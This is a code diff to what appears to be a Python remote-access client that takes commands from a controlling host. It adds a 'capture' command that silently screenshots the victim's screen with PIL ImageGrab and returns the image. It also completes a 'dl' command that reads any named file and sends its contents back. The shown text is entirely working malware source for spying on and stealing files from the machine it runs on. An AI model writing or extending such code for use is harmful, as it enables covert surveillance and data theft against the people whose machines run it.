@@ -3,6 +3,8 @@ import time
 import subprocess
 import platform
 import os
+from PIL import ImageGrab
+
 
 HOST_IP = "127.0.0.1"
 HOST_PORT = 32000
@@ -52,6 +54,19 @@ while True:
     elif len(commande_split) == 2 and commande_split[0] == "dl":
         try:
             f = open(commande_split[1], "rb")
+        except FileNotFoundError:
+            reponse = " ".encode()
+        else:
+            reponse = f.read()
+            f.close()
+
+    elif len(commande_split) == 2 and commande_split[0] == "capture":
+        capture_ecran = ImageGrab.grab()
+        capture_filename = commande_split[1] + ".png"
+        capture_ecran.save(capture_filename, "PNG")
+
+        try:
+            f = open(capture_filename, "rb")
         except FileNotFoundError:
             reponse = " ".encode()
         else:
